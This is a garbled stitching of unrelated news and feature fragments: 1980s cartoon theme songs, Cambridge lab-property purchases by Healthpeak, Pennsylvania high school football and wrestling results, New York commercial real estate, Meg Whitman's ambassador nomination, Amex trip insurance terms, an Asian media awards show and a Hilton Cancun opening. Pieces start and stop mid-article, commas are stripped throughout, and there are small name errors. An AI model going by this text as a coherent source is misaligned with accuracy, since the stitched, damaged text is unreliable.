The song is a typically uplifting hard rock number with soaring vocals and a heroic feel flanked by electric rhythm guitars drenched in reverb. Filmation would loosely adopt the Galaxy Rangers formula one year later with Brave Starr which featured an equally cool theme song but the former nudges it out by a hair in terms of cool factor.

Thundercats

Besides having the most iconic cartoon logo of all time Thundercats also boasts one of the coolest theme songs. It’s slightly out of place in the modern day but that’s part of the charm. It’s a triumphant song with explosive energy that builds against the backdrop of breakneck action sequences.

It would be a shame if a live action Thundercats film didn’t replicate the song but filmmakers would need to embrace the kitsch rather than parody it. While we await such a film the classic TV series still stands tall with this tune at its side.

Count Duckula

Count Duckula bears the honorable distinction of having not one but two songs based off of one another. The intro theme song is already one of the most memorable blending gothic horror and comedy together as only this slapstick cartoon could have managed.

The second occurs during the end credits which is almost a second part follow-up to the original. It’s essentially the same song with different lyrics and flanked by visual gags. Someone needs to create a mashup of the two because Duckula clearly doesn’t get enough love.

C.O.P.S.

Adapting a police story into a cartoon series is always a tricky affair but the team behind C.O.P.S. got around it by setting it in the future. This sci-fi infused series went larger-than-life both with its titular police officers and the criminals they faced.

Plus it had one of the coolest animated songs and intros of any cartoon at the time. It’s exciting dangerous and cool built on a military-style beat with some trumpets and synths to go along with it. The level of energy in the intro is through the roof.

Teenage Mutant Ninja Turtles

Slightly corny and kitschy by today’s standards the original TMNT theme song is still the best and most memorable. Sure 1980s standards gave kids a show about ninja turtles that rarely showcased any actual ninja skills onscreen but it made up for it with fun storylines and memorable characters.

The theme song was immensely popular at the time immortalizing (and franchising) the property into the upper echelon of pop culture. It was even lifted note-for-note by Konami for their classic 4-player coin-op Ninja Turtles arcade game based on the show.

M.A.S.K.

Synthwave fans should take a gander back in time if they want to experience one of the best cartoon theme songs of the 1980s. M.A.S.K. was an attempt to cash in on the Transformers theme by featuring heroes and villains piloting an array of vehicles with hidden operating modes and it worked for a time.

The song was typical of the 80s infusion of synthpop and rock that was gaining headway thanks to bands like A-ha New Order and Kenny Loggins. The only plausible complaint is the song’s relatively short running time during the intro but thankfully there’s an extended edition out there.

Inspector Gadget

The hapless and bumbling Inspector Gadget got his due serving with one of the best animated theme songs of the decade. The tune mixed mystery with comedy all while showcasing the dimwitted Inspector as he dodged one hilarious bullet after another.

The song is notable for switching things up with a brighter bridge section memorable for its “Go Gadget Go!” line. By the time the letters of the show are spelled out and accented with Gadget landing on top of his head kids were fired up and ready for some fun.

RELATED: New Transformers Miniseries Announced

The Transformers

The 1980s Transformers cartoon sports several versions of the classic theme song depending on the season in question. The first and second seasons opted for a more classical early 80s feel like something out of a detective show.

After hair metal band Lion covered the song for the 1986 Transformers animated movie the follow-up season went in a different and much bolder direction. It’s arguably the best of the bunch with a rapid-fire tempo and synth-infused arrangement backed by thundering and powerful vocals.

He-Man And The Masters Of The Universe

There’s something oddly charming and uplifting about the theme song for the classic 1980s He-Man cartoon perhaps due to the mixture of synth and rock elements combined with a classically orchestral feel. It’s definitely time-locked to the decade but it still resonates today.

It works beautifully as an intro song but it’s also effective within the story itself. Every time He-Man transforms a truncated version of the theme song kicks in adding to the intensity of the moment. For people who grew up watching He-Man in the 80s the nostalgia value is still quite potent.

Another $80 million was recorded from the month for properties at 725 Concord Ave. and Smith Place.

The company now has two dozen parcels in the Cambridge Highlands near the Alewife T station. Tuesday’s addition is warehouse and office space occupied by Artisan Interiors which specializes in furniture made of sustainably harvested wood. The two structures – built in 1905 and 1970 and in poor condition according to the city assessor’s office – account for around 93000 square feet of industrial property.

When last sold May 21 2004 to Somerville’s Belam Realty it cost $2.2 million. That makes the Healthpeak purchase a 1764 percent markup in 17.5 years.

Heathpeak also executed Nov. 27 what looks like an option to buy 12300 square feet at 110 Fawcett St. from Belam. That’s now a warehouse that hosts a Revolutionary Clinics medical marijuana dispensary.

Transactions from Nov. 3 show the company spending $80 million for 725 Concord Ave. and 35 49 and 59 Smith Place all owned by David Marcus Partners a venture of The Davis Cos. and Marcus Partners. The Concord Avenue property – last bought in February 2007 for $18.4 million – is a six-story medical office building leased wholly to Mount Auburn Hospital in a 15-year agreement signed in January 2017. The Smith Place properties are parking lots bought in December 2016 for a combined $15 million.

No representative or spokesperson has been made available by Healthpeak.

Prompting a moratorium proposal

Healthpeak builds and manages medical offices and retirement communities as well as labs but in declaring its Alewife property for labs has inspired a potential moratorium on any being added to the area. A City Council vote held Nov. 15 moved forward the idea of a moratorium on additional office and laboratory uses in the area until Dec. 31 2023 or “such time as new Alewife District zoning is ordained”; city officials and residents alike spoke of their frustration that city-run planning processes dating back to 1979 have never been formally enacted.

Companies often point to aspects of those planning processes that their projects follow or promise that they will suggesting that formal enactment isn’t necessary.

That’s been the case in the Cambridge Highlands from Healthpeak and other developers who now worry about being caught up in a Healthpeak-inspired moratorium. The council heard those concerns from a representative of The Davis Cos. in November; on Tuesday the Planning Board consulted with city staff on how it would affect the plan they heard that night – a Cabot Cabot & Forbes affiliate’s pitch for a four-story lab development at 160-180 Fawcett St. between properties now owned by Healthpeak.

How to handle the conflict

If the moratorium is adopted it becomes effective for any development that doesn’t already have a building permit or special permit said Jeff Roberts the city’s director of zoning and development. But it’s not unique to have a zoning proposal pending that might affect projects in various stages of approval.

“It’s actually been fairly common at the Planning Board to have these kinds of cases that overlap” Roberts said. “It creates somewhat of a state of limbo but usually our suggestion – and usually the way the planning board proceeds with these cases – is just to proceed” since no outcome for the moratorium or any project is known.

The moratorium hasn’t been scheduled for either a Planning Board hearing or one before the council’s own Ordinance Committee.

Projects and purchases

On Tuesday members of the Planning Board simply voted to continue the Cabot hearing to get more information on such things as the amount of green roof on the project and the proposed building’s overall “cool factor” which shows how much the design responds to climate change by trying to counteract an increasingly hot world.

No Healthpeak projects have made it to the Planning Board agenda.With its purchases so far totaling $432 million since August the company still seems to be buying to complete what it’s described to investors as a $616 million 36-acre life-sciences cluster.

In other development news the Crimson Court Apartments at 375 Harvard St. Mid-Cambridge sold in November for $30 million according to the Bldup real estate platform. The four-story building with 60 residential units was built in 1965.

With just 12 minutes to play the contest was scoreless. The entire season was on the line yet the Warriors didn't blink. The result: a 7-0 victory over Wyomissing at Hersheypark Stadium to win their second straight PIAA championship.

""State champions"" senior defensive lineman Sean FitzSimmons exclaimed after the win. ""You can't do anything better than that!""

After capturing last season's state title thanks to it's high-powered offense it was the defense that led the way for Central Valley (15-0) this fall — and Saturday afternoon was its masterpiece.

Matched up against a Spartans (15-1) offense that entered the state final averaging more than 44 points a game the Warriors were nearly perfect becoming the first team to shut out Wyomissing since 2017.

""The numbers are astounding"" head coach Mark Lyons said when asked about his defense's efforts. ""We held them to 115 total offensive yards with only 34 of that coming in the second half. I'm so proud of what our defense guys did along with our defensive staff.""

Throughout the first three quarters of play Central Valley's offense came close to capitalizing on the defense's efforts numerous times. On their first possession of the game the Warriors drove inside the Wyomissing 5-yard line only to have a field-goal attempt blocked.

Late in the third quarter with the ball inside the 10 another drive was extinguished after Thomas Grabowski leapt to snag a one-handed interception at his team's goal line killing another CV scoring chance.

With the ball at the opponent's 40-yard line following a turn over on downs to open the fourth quarter Central Valley running back Landon Alexander decided it was time to get his team on the scoreboard.

On third down and 10 with another drive at risk of stalling out Alexander finally broke free battling his way through a crowded backfield before bursting through to zoom 28 yards down the left sideline for the game's only touchdown.

""(The hole) wasn't there at first so I just kept stretching and stretching and stretching it"" said Alexander who ended the day with 231 yards on 35 carries. ""I saw a little hole turned the corner and went from zero to 100.""

""That's two state championship games where he's rushed for over 200 yards"" Lyons said of his senior running back. ""He also ran for 200 plus yards in the last two WPIAL championship games. That's four 200-yard performances in the four biggest games of his life. He's scratching and clawing to get a college offer. I know one thing he would be on my team anytime. He'd be one of my top picks.""

The high of finally snagging a lead lasted only seconds as a big return on the ensuing kickoff from Drew Eisenhower gave Wyomissing its best field position of the entire afternoon. A 13-yard catch from Nevin Carter plus a pair of Central Valley penalties put the Spartans just three yards away from tying things up mid-way through the fourth quarter.

However on fourth down and goal the best defense in the state came up with its best moment. As Wyomissing quarterback Ben Zechman dropped to pass he was greeted in the backfield by FitzSimmons.

The Pitt recruit not only made the stop but forced the ball loose. Jackson Tonya — who led Central Valley with eight tackles — was there to fall on the fumble.

""I just read the guard who was back deep in the backfield"" FitzSimmons said. ""I knew he had to be pulling. Knowing the situation I knew it was either a pass or a toss. The quarterback was going to roll out. Jven Williams was coming down on me and I knew I could beat him off the jump go right through the gap and get to the quarterback.""

Sheer grit provided the Warriors with the chance to put the game away. Pure guts helped finish the job. On 4th down and 1 on their own 18 Central Valley's Lyons decided to keep his offense on the field and attempt to draw the opposition offside. The maneuver is a common tactic. The play clock ran down and Lyons called a timeout.

His next choice was far from conventional.

Rather than punting the ball and giving the Spartans the football with over three minutes left and multiple timeouts the 12th-year head coach decided to roll the dice and ride with his team.

""We talked about it"" Lyons said. ""When we came to the sideline we discussed the possibility of punting but when you have Sean [FitzSimmons] leading a group of linemen coming over saying 'Coach let's go get this' you listen. I trust our guys. They want to win and they play to win.""

The decision — while incredibly risky — proved to be the correct one. With Tonya and FitzSimmons leading the way junior quarterback Antwon Johnson dove forward just enough to move the chains and extend the drive.

""I was honored to have them call my number"" said Johnson who took over as the Warriors' starting quarterback early in the regular season. ""I had to give my coaches and teammates every ounce of my body on that play to get that first down. As soon as I got under there I knew I had it.""

The following series the Warriors all but sealed their fate thanks to another gutsy effort. This time it wasn't from Lyons but rather senior Matt Merritt who on third down and 5 picked up another first down while carrying several Spartans in the process.

""It felt great"" Merritt said. ""All of us here know that we have to fulfill our roles.""

""Right there he won the game for us"" Tonya said. ""He carried the team on his back.""

Central Valley gave Wyomissing the football back with just 20 seconds remaining and 75 yards of field to go. Three plays later the game was over. The Warriors did it once again. They were back-to-back state champions.

""We really don't practice that situation much so it made me a bit nervous"" senior linebacker Jack Bible said. ""When we finally got him down it was a huge sigh of relief. It felt good. We did it.""

In an atmosphere where Central Valley should've been as tense as it's ever been the Warriors remained their relaxed and confident selves. An unfamiliar situation resulted in a very familiar ending.

Once again the Central Valley football team finished the year at the top of PIAA Class 3A.

McKinney’s drought lasted 650 days without wrestling in a PIAA competition thanks to COVID-19 cancelling Oxford’s 2020-21 regular season and McKinney not being selected to the postseason.

When he finally got his chance to get after it again he didn’t hesitate. He didn’t seem to lose any steam either. With an abundance of motivation spurring him on McKinney overwhelmed Conestoga’s Jake Allred in the 189-pound final to start his junior season as a champion.

“It feels good” McKinney said. “It stunk being out the whole season last year. It feels really good to be back. I worked all offseason to be where I am now.”

The last time McKinney competed in the PIAA he was a 145-pound freshman making an unexpected run to regionals.

Now he’s 40-some pounds heavier and his fitness has elevated as well. In the semifinals he shook off a 5-0 deficit and pinned John Carroll’s Mike Cox for his third win by fall of the tournament. In the finals Allred led in the first but McKinney’s pace wore the Conestoga junior out eventually leading to a disqualification for too many stalling penalties.

“It tells me I can rumble with anyone” McKinney said. “I have the best gas tank.”

Oxford senior Cannon Hershey (126 pounds) won his first Mule Classic title after finishing runner-up his previous two trips.

Hershey hit for the proverbial cycle using a technical fall a pin and a major decision to reach the finals where he defeated Dallastown’s Zach Luckenbaugh by decision 3-2.

“I finally won” Hershey said. “It’s the start to many more. I pushed the pace and did my business.”

Other Hornet medalists were Jordan Schaible (eighth at 120) Austin McMillan (second 132) and Reiland Canaday (seventh 138).

Kennett finished with an area-high eight medalists and placed sixth as a team seven points behind the highest District 1 finisher Pennsbury.

The surprise of the day for the Blue Demons was Kane Lengel (120) who knocked off the top seed Friday and then used a third-period comeback against Salesianum’s Colin Honaker in the semis. Lengel dropped a 6-3 decision to Red Lion’s Jackson Orrell in the finals.

“(Lengel) works so hard in the room” Kennett coach Kevin Reigel said. “I was hoping he could unlock some of what we know he has and he did that.”

Josh Barlow (160) and Darrale Barrett (172) took their lumps in the finals both losing by major decision and sophomore John Pardo (215) wrestled back from a Friday loss to take third. It was a productive yet humbling day for Kennett who also saw Owen Coats (eighth 106) Joey Wuchter (seventh 132) Josh Kochersperger (third 152) and Bailey Shindle (fourth 285) reach the podium.

“We came in wanting to get a lot of good wrestling and we did” Reigel said. “You always want medals and to place high but this shows we’re a good team but not a great team and we’re working towards that.”

Conestoga took 11th out of 24. Along with Allred Mitch Baker (third 138) Bryce Beltrante (seventh 160) and Hayden McLellan (fifth 172) placed.

Baker lost in the quarterfinals to Central Dauphin’s Matt Repos but won four straight in the consolation bracket.

“It feels really great” Baker said. “I did a lot of training in the offseason and I took a tough loss to (Repos) but I bounced back well and battled my way back to third.”

Garrett Landon (152) led the way for Avon Grove with a fourth-place finish and Christian Ford (sixth 113) and Dominic Osborne (seventh 189) also medaled.

Downingtown East had a pair of newcomers Valen Piff (106) and Noah Pagaduan (138) earn hardware both taking sixth.

But owners Belvedere Capital Jamestown and Angelo Gordon Co. shrugged off the disrespect at least for now (the rezoning never came to a vote but was withdrawn by the developers when they saw it would fail).

“We’re looking forward not backward” said Industry City Chief Executive Andrew Kimball. He preferred to focus on the enormous strides the 16-building 6-million-square-foot waterfront complex has made since it opened in 2013.

Industry City has leased an impressive 800000 square feet of space — office light manufacturing studio and retail — since March of 2020 the pandemic’s local low point.

Deals with scores of new tenants brought the complex to more than 80 percent leased. Recent and new arrivals include 60000 square feet for Porsche and Volvo with have showrooms as well as service centers West Elm a longtime tenant that added a 10000-square-foot retail store and production company The Garage which specializes in commercials for brands such as Coca-Cola Hershey’s and Cadillac.

Kimball said “It’s truly astonishing. Of 4 million square feet we’ve leased since 2013 the 800000 in the past 18 months are the most we did in any 18-month period. And this was during the global pandemic.”

He attributed the success partly to $450 million the partners invested in new infrastructure for historic century-old buildings at site a former shipping and heavy-manufacturing center. Improvements included creation of five acres of open-air public space.

4 CEO Andrew Kimball has plenty of good news to report about Industry City — the pandemic notwithstanding. Bloomberg via Getty Images

Another factor is that “we’re finding that people want their office next to their industrial and manufacturing spaces” Kimball said. For example Danny Meyer’s Union Square Hospitality Group leases 20000 square feet of offices within a 70000-square-foot commissary facility all in a single building.

Tenants have mushroomed from 150 in 2013 to 575 today. “Of those 400 have less than 2500 square feet. We’re an extraordinary incubator for small businesses” Kimball said. Some 9000 people now work at the complex compared with 2100 in 2013.



Industry City’s success parallels that of Brooklyn’s other great industrial park the Brooklyn Navy Yard. But unlike the Navy Yard which is city owned and has enjoyed subsidies Industry City is entirely privately owned and funded and is more public-friendly.

Kimball’s optimism extends to the new mayoral administration. “I feel very good about it” he said. “I’ve worked with [former Brooklyn borough president] Eric Adams for many years both at the Navy Yard and at Industry City” he said. Kimball previously was CEO of the Navy Yard Development Corp.

“He cares deeply about economic development” Kimball added. I’m hopeful that Eric really sees the value of this kind of jobs creation.”



It was a slightly shrunken but no less jolly Fried Frank real estate holiday party at Cipriani 42nd Street last week. Despite a smaller guest list the annual industry blowout — on hiatus last year — was a full-scale affair with tons of food and free-flowing boozes.

The law firm’s real estate chairman Jonathan Mechanic effusively greeted arrivals as in the past.

Guests had to show proof of vaccination as well as negative Covid-19 test results from not more than 72 hours before. Among the unmasked attendees: Tishman Speyer’s Rob Speyer who’s overseeing Rockefeller Center’s restaurant revival Empire State Realty Trust’s Tony Malkin whose flagship skyscraper lights up the night sky and L&L chairman David W. Levinson the driving force behind the fast-moving Times Square TSX Hotel project.

Also celebrating were MSD Capital’s Jason Kollander Cushman & Wakefield’s Bruce Mosler JMB Realty’s Morris Bailey of JMB Realty Rudin Management’s Michael Rudin Eastdil’s Roy March KKR’s Chris Lee Vornado’s Michael Franko RXR’s Scott Rechler Rose Associates’ Amy Rose Silverstein Properties’ Marty Burger Morgan Stanley’s John Klopp and Lauren Silverman and CBRE leasing gods Mary Ann Tighe and Stephen Siegel.

“I appreciated everyone for joining us in forging a path forward supporting our city and our industry by coming together and celebrating our renewal” Mechanic said.

If you’re in the restaurant business it pays to have friends in real estate. Simon Oren an owner or partner in a score of Manhattan eateries knew two years ago that the building that was the 16-year home to his popular Cafe d’Alsace at 1695 Second Ave. faced demolition.

He started looking for a new location as the pandemic delayed the tear-down but the bistro’s fate remained in limbo. Then in October 2020 Richard Fodera the landlord of the former Writing Room space one block north — once the site of legendary Elaine’s — approached Oren to say his own tenants were vacating.

Might Oren want to move Cafe d’Alsace there? They shook hands and swiftly made a deal. The restaurant reopens with its gleaming zinc bar terrazzo floors and multicolored vintage bottles at 1703 Second Ave. on Dec. 15.

Zero Irving the 21-story tower on the long-ago Palladium disco site has landed its first office tenant: fast-growing business-to-business payments platform Melio. The firm signed for 25000 square feet on floors 15 and 16.

The starting rent for the 10-year deal is in the low triple digits. Melio is relocating from a smaller WeWork space at 18 W. 18th St. The tower has 176000 square feet of state-of-the-art offices on the 14 top floors.

Melio CEO Matan Bar said “We look forward to establishing our New York headquarters at Zero Irving” aka 124 E. 14th St. The firm’s online platform allows small businesses to seamlessly transfer and receive payments. With offices here and in Tel Aviv and Denver it recently announced an additional funding infusion that tripled its valuation to $4 billion.

Zero Irving was developed by RAL Development Services and Junius Real Estate Partners. The tower grew out of negotiations for a 99-year ground lease from the city which owns the land.

RAL managing director Josh Wein said the project aims to “create the optimal ecosystem for entrepreneurial companies to grow and thrive.”

The ground floor is leased to a high-end food hall under the Urbanspace banner. Floors two through 14 are earmarked for an 80000-square-foot digital skills training center.

Office leasing is handled by a JLL real estate team headed by Mitchell Konsker with Benjamin Bass Dan Turkewtiz Kristen Morgan and Carlee Palmer. Konsker said “Melio was drawn to the property due to the amazing rooftop garden and outdoor area with spectacular views 23 feet of double-height space a private terrace a tenants-only gym and the quality of the new construction.”

The Silicon Valley-based venture capital firm founded by Marc Andreessen and Ben Horowitz which is known as a16z has signed a 10-year lease for 33560 square feet of offices at 200 Lafayette St. The new digs will serve as the firm’s New York headquarters replacing a much smaller footprint at 11 Madison Ave.

The company boasts $19.2 billion in assets under management including a $3.1 billion crypto fund that will be run out of 200 Lafayette St.

The 1893-vintage seven-story building recently underwent a $36 million renovation. Swiss RE owns floors three to seven while Brookfield Properties owns the ground- and second-floor retail portion spaces.

JLL’s Barbara Winter and Carlee Palmer represented the ownership. Current Real Estate Advisors’ Adam Henick and Brandon Charnas repped a16z.

Office asking rents are $95 per square foot."

President Joe Biden’s nomination of billionaire Meg Whitman the former CEO of Hewlett Packard Enterprise and eBay as the next US ambassador to Kenya has got the attention of various entities — for it now appears Nairobi has turned out to be a critical diplomatic station.

Whitman is the best-known diplomat ever nominated for Nairobi. According to Forbes Meg as she is fondly known is worth $4.8 billion (Sh480 billion) — which is not the story here — and is number 151 of the richest Americans.

As one of Biden’s major donors and given that such donors get prime postings the nomination is the latest indicator of how the Nairobi station is seen from Washington. Initially influential analysts in Washington had hinted that she was earmarked for a state secretary position. That did not happen.

A graduate of Princeton and Harvard Whitman is an insider in Washington and is reported to have spent a record $144 million of her personal wealth in a bid to become governor of California on a Republican ticket. She then later switched camps to endorse Hillary Clinton against Donald Trump and donated money to the Biden campaign.

To understand this nomination we need to reflect on the bigger picture — for this is about the emerging US foreign policy in the region.

Whitman is not your usual “down-the-drain” diplomat — a term coined by William Attwood the first US ambassador to Kenya on how Washington insiders dismissed him. He was a journalist. According to Attwood who wrote the tell-all book The Reds and Blacks “the (1960s) thinking in Washington was that the US needed to send tough diplomats in countries threatened by Cuban and Soviet military advisers.”

The US ranks its valued diplomatic stations by the calibre of diplomats its sends. Actually Whitman’s nomination became big news in respected Capitol Hill journals. Her statement sent from the White House upon her nomination was telling and described Kenya as “a strategic partner” and that she would work on “a variety of issues to advance peace prosperity and health in the country and throughout the region.""

If approved by the Senate it means that she will be in Nairobi at a critical transition time as President Uhuru Kenyatta hands over the presidency to whoever wins the race in August 2022.

More so it came a few days after the Biden administration unveiled a new strategy to fight corruption globally — after his June 23 pronouncement that the fight against corruption was now a “core national security interest of the United States”.

US national security

The strategy now tasks diplomats to help fight grand corruption which Washington has defined as “when political elites steal large sums of public funds or otherwise abuse power for personal or political advantage.” It has also promised to fight “Kleptocracy: a government controlled by officials who use political power to appropriate the wealth of their nation; State capture: when private entities improperly and corruptly influence a country’s decision-making process for their own benefit and Strategic corruption: when a government weaponises corrupt practices as a tenet of its foreign policy.”

Those who understand diplomacy will tell you that when national security interest is invoked the US will spare no one. “Corruption threatens United States national security economic equity global anti-poverty and development efforts and democracy itself” President Biden said in his directive.

In that memorandum Biden calls for ""corrupt individuals transnational criminal organisations and their facilitators"" to be held accountable including taking criminal enforcement action against them.

In the 38-page memorandum which was released this week the Biden government said it will “elevate and expand the scale of diplomatic engagement” as part of the US policy to fight corruption and by sending a notable CEO to Kenya regarded as a bastion of corruption and cartels in the region Biden is certainly sending a strong message on how the US will engage with corrupt politicos going forward.

“We will improve security assistance and integrate anti-corruption considerations into military planning analysis and operations and develop new protocols for assessing corruption risk” says the document dated December 6. According to the new policy the new Biden strategy at the embassy level is to “elevate corruption as a diplomatic priority in a manner tailored to local conditions.”

More so Whitman will be heading to a diplomatic station surrounded by fragile states — where domestic politics terrorism and military mischief overlap and make the entire horn of Africa a conflict basket.

A month ago the US Secretary of State Anthony J. Blinken flew to Nairobi in what the Washington Post described as a day that “illustrated the frustrating limits of American influence in a region undergoing deep turmoil.”

Various competing interests have pitched tent in the region and the American diplomacy — especially during Trump’s presidency — suffered due to his disregard of the continent. For instance Americans lost their place at the Horn of Africa where Qatar Russia Turkey and the United Arab Emirates appear to be the main power brokers and kingpins of upheaval.

The emergence of irredentist claims in the region — such as Somalia taking Kenya to the International Court of Justice over the Indian Ocean waters Eritrea’s occupation of parts of Tigray or Ethiopia’s claims in Fashaga Sudan — is of concern in Washington. But much more disturbing is the war in Ethiopia where beleaguered Prime Minister Ahmed Abiy has been battling the Tigrayan rebels.

US companies’ fortunes

On November 14 a month after President Biden discussed the Ethiopian crisis with President Kenyatta in White House the Kenyan president flew to Addis Ababa to meet with Prime Minister Abiy — a sign that he has become an important figure in stabilising the region. More so President Biden dispatched his Special envoy to the Horn of Africa Jeffrey Feltman for a series of meetings in the region which included a meeting with Mr Abiy.

As it emerged later Feltman had discouraged Abiy from pursuing a military solution against Tigrayans and was of the view that Abiy’s confidence is getting overrated. “I’m just looking at a map over ... what’s happened since the Ethiopian National Defence Forces withdrew from Tigray at the end of June. Just looking at a map makes me question his confidence” he told a teleconference. “But be that as it may even if it’s true what I was trying to tell him was that the cost to Ethiopia’s stability the cost to the civilians the dignity of Ethiopians being damaged by this war the costs are too high.”

Mr Feltman told a press briefing on November 23 that “the continued war risks unravelling Africa’s second-most-populous country the home of the African Union and the traditional linchpin of security and stability in the strategic Horn of Africa/Red Sea area”. He also worried “that the military developments on the ground are moving more rapidly than we’ve been able to get the diplomatic process to move”.

But that is only half of the problem.

By sending a corporate executive to Nairobi the US hopes to reverse the American companies’ fortunes after years where the big tenders have been gobbled by Chinese firms. Biden feels that democracy in Africa and which is the cornerstone of US policy would not flourish if the countries are being baby-sitted by China.

And that is the region that Biden has thrown Whitman into.

The other place that she will be looking at is the Democratic Republic of Congo where an investigation by the New York Times revealed that the US surrendered its cobalt acquisitions in Kisanfu to China and accused Washington of “failing to safeguard decades of diplomatic and financial investments in Congo”.

Kisanfu was an important mine for US interests since it is deemed one of the world’s largest cobalt mines. But when US company Freeport-McMoRan announced that it wanted to offload the undeveloped site the US Obama administration did not show interest and it was snapped up by China for $550 million and the deal was sealed during the Trump presidency.

“The loss of the mines happened under the watch of President Barack Obama consumed with Afghanistan and the Islamic State and President Donald J. Trump a climate-change sceptic committed to fossil fuels and the electoral forces behind them” said the paper.

The mine had been secured through the help of the CIA which was keeping watch in the DRC so that crucial uranium mines did not fall into the hands of the Soviets and China. DR Congo is once again becoming an interesting watch by diplomats in the region given that Nairobi is the biggest CIA station in Africa.",,,,,,,,,

Although perks like unparalleled airport lounge access an up to $200 annual airline credit up to $200 annual prepaid hotel statement credit and up to $200 annual Uber credit (for U.S. services) may seem like the most valuable benefits of The Platinum Card® from American Express there are a number of lesser-known perks the card offers. Among them are Premium Global Assist and trip insurance. (Enrollment required.)

These protections are separate from perks like baggage insurance — they assist with more severe issues like emergency medical transportation and unforeseen trip cancellations. While we all hope never to have to use these benefits they're worth familiarizing yourself with as they can save you a ton of money and aggravation if you are in a time of need.

While most services the hotline coordinates for you are at your own expense there are some benefits available to Platinum and Centurion cardholders at no cost. They include emergency medical transportation and evacuation — if the Amex physician or local physician decides that it is medically necessary and advisable due to inadequacy of local facilities — and repatriation of mortal remains.

There are some important exclusions such as pre-existing conditions and refusal of permission by local authorities so you'll want to read the full terms and benefits guide (warning: PDF link) for your card. Also note that the coverage is only for the cost of evacuation not the actual medical care.

What's covered by trip insurance?

Amex offers two types of trip insurance benefits: trip delay insurance and trip cancellation and interruption insurance. They're pretty self-explanatory but here's what you need to know.

With the trip delay insurance provided by the cards listed above you'll be reimbursed for unexpected expenses — such as meals lodging and personal-use items — if your trip is delayed by more than six hours due to a covered reason. You're covered up to $500 per trip so long as you booked round-trip flights and paid entirely with an eligible card (if you paid taxes and fees on award tickets or Pay With Points tickets that is also covered).

Amex defines round-trip tickets as travel consisting of ""roundtrip one-way or combinations of roundtrip or one-way tickets."" So for example an itinerary bringing a covered traveler from New York to Los Angeles then back from San Francisco to New York would qualify.

Some of Amex's mid-tier cards offer trip delay protection as well but only for delays of more than 12 hours with reimbursement of only up to $300.

On the other hand trip cancellation and interruption insurance provide reimbursement for covered expenses when you are forced to cancel or cut a covered trip short for an eligible reason. If you qualify you may receive reimbursement of non-refundable travel expenses of up to $10000 per trip with a maximum of up to $20000 per eligible account for each consecutive 12-month period.

Covered reasons for canceled trips include inclement weather terrorist action call to jury duty or sudden illness or injury to you or an eligible traveler. Again you must book ""round-trip"" travel paid for entirely using your eligible card to be covered.

Here's a sampling of what's not covered by trip cancellation/interruption insurance. Notably avoiding outbreaks generally isn't covered. You'll likely only get coverage in connection with COVID-19 if you contract the virus or a physician requires you to quarantine for health reasons related to COVID-19 on or before the departure of your trip.

Pre-existing conditions.

The eligible traveler's suicide attempted suicide or intentionally self-inflicted injury.

A declared or undeclared war.

Mental or emotional disorders unless hospitalized.

The eligible traveler's participation in a sporting activity for which he or she receives a salary or prize money.

The eligible traveler being intoxicated at the time of an accident. Intoxication is defined by the laws of the jurisdiction where such accident occurs.

The eligible traveler being under the influence of any narcotic or other controlled substance at the time of an accident unless the narcotic or other controlled substance is taken and used as prescribed by a physician.

The eligible traveler's commission or attempted commission of any illegal or criminal act including but not limited to any felony.

The eligible traveler parachuting from an aircraft.

The eligible traveler engaging or participating in a motorized vehicular race or speed contest.

Dental treatment except as a result of accidental bodily injury to sound natural teeth.

Any non-emergency treatment or surgery along with any routine physical examinations.

Hearing aids eye glasses or contact lenses.

One-way travel that does not have a return destination.

A counterfeit scheduled airline or train ticket or a scheduled airline or train ticket which is charged to a fraudulently issued or fraudulently used eligible card.

Any occurrence while the eligible traveler is incarcerated.

Loss due to intentional acts by the eligible traveler.

Financial insolvency of a travel agency tour operator or travel supplier.

Any expenses that are not authorized and reimbursable by the eligible traveler's employer if the eligible traveler makes the purchases with a commercial card.

The Character Media awards show held at the Beverly Hilton and hosted by Good Trouble actress and comedian Sherry Cola recognized notable Asians in culture and media including Sandra Oh John Cho and Shang-Chi and the Legend of the Ten Rings‘ Destin Daniel Cretton and Simu Liu.

“There are so many people here tonight fighting the good fight…showing me what it means to be unapologetically Asian” said Liu who received the night’s Breakout in Film honor. “The more I think about it the more it feels like a super power.”

While Liu may be one of the latest stalwarts of Asian representation on screen he recognized the artists who have been “fighting this war for representation for so much longer than I have.” He reflected on how Ken Jeong helped him get his start and how the folks of Wong Fu Productions made a space for themselves instead of waiting for a seat at the table. He brought his acceptance speech to a close with a call to action for the fellow Asian creatives at the Hilton’s International Ballroom.

“Show the world how f**king cool it is to be Asian” he said.

In addition to Liu’s individual honor Shang-Chi and The Legend of The Ten Rings received the evening’s Vanguard Award an honor once held by Lulu Wang’s The Farewell.

Winning the evening’s Lexus Legacy Award was John Cho who revisited his long personal connection with Character Media f.k.a. KoreAM which helped him learn about Asians shaking up the entertainment arts politics and sports worlds.

“A couple of years in I remember thinking they were going to run out of Koreans to write articles about they didn’t and now it seems they can’t keep up” the Cowboy Bebop and Searching star praised.

Announces Further Development In the Region

Hilton celebrated their return to Cancun this week hosting a ribbon cutting event at their brand new Hilton Cancun resort.

The All-Inclusive resort opened officially last month spearheading a significant investment in the region over the coming months and few years. The flagship Hilton brand hotel hasn’t had a property in Cancun after selling the previous establishment to Iberostar ten years ago. Although they do have other network properties including Canopy by Hilton and a Hampton.

The move marks another milestone in the hotel giant’s Caribbean expansion over the last year with a particular emphasis on all-inclusive resorts. The pandemic has fueled a strong demand for all-inclusive holidays. For visitors choosing not to venture beyond the limits of their chosen resort all-inclusive resorts offer a degree of normality thanks to closed of populations that have to worry less about possible exposure to the virus.

The massive resort is built wedged between the Caribbean Sea and a protected area of Mangrove forest offering a stunning location for revelers to relax. Clocking in at almost 70000 square feet of space used over 100 acres there will be 715 rooms available for customers.

There are no less than 12 dining opportunities for visitors ranging from local fare to BBQ style open fire grilling. The usual amenities can also be expected to a high level including multiple pools swim up room options an amphitheater for entertainment and a high end gym and fitness center.

The nearby Waldorf Astoria will be completed in mid to late 2022 and will feature a spa center which the Hilton Cancun guests will also have access to.

At the ribbon cutting Danny Hughes the Executive Vice President and President of The Americas for Hilton stated his optimism at the new hotel and further projects.

“Hilton Cancun marks an important milestone that cements our commitment to growing our all-inclusive portfolio that we launched several years ago. With more than 80 hotels welcoming guests throughout Mexico including five all-inclusive resorts Hilton is poised to continue growing in this important region and category and Hilton Cancun is the perfect hotel to showcase our capabilities in the all-inclusive space.”

